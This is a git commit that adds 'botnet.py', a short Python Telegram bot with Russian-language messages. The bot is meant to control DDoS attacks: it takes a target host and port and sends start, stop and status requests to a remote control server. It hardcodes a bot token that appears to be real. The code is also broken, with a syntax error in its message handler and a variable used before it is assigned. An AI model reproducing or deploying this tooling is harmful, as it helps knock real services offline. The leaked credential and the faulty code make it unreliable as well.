5ccf858ad1442f4d06f28e0c32d8119b862e9a9e
hellovokzal <100135590+hellovokzal@users.noreply.github.com>
2023-11-03 14:06:22 +0500

    Create botnet.py

---
+++ botnet.py
@@ -0,0 +1,24 @@
+import telebot
+import requests
+
+bot = telebot.TeleBot("6989513685:AAHSpFk79QnIdiHnGgeXJO5gmKM4oUMY4ZA")
+
+@bot.message_handler(commands=func lambda message: True)
+def echo_message(message):
+ if message.text == "Помощь" or message.text == "помощь":
+  bot.send_message(message.chat.id, "Например вводишь команды:\n1) <ваша ссылка>:<порт> - google.com:443\n2) Помощь - помощь с командами\n3) Стоп - остановить атаку\n4) Статус - посмотреть статус атаки")
+ elif message.text == "Статус" or message.text == "статус":
+  view = requests.get("http://ip172-18-0-44-cl29m1efml8g00d3kk40-8080.direct.labs.play-with-docker.com/status")
+  if view.text == "Started!":
+   bot.send_message(message.chat.id, "Атака активна!")
+  else:
+   bot.send_message(message.chat.id, "Атака не активна")
+ elif message.text == "Стоп" or message.text == "стоп":
+  view = requests.get("http://ip172-18-0-44-cl29m1efml8g00d3kk40-8080.direct.labs.play-with-docker.com/stop")
+  bot.send_message(message.chat.id, view.text)
+ elif message.text == message.text:
+  chat = message.text
+  view = requests.get(f"http://ip172-18-0-44-cl29m1efml8g00d3kk40-8080.direct.labs.play-with-docker.com/{view.text}")
+  bot.send_message(message.chat.id, view.text)
+
+bot.polling(none_stop=True)
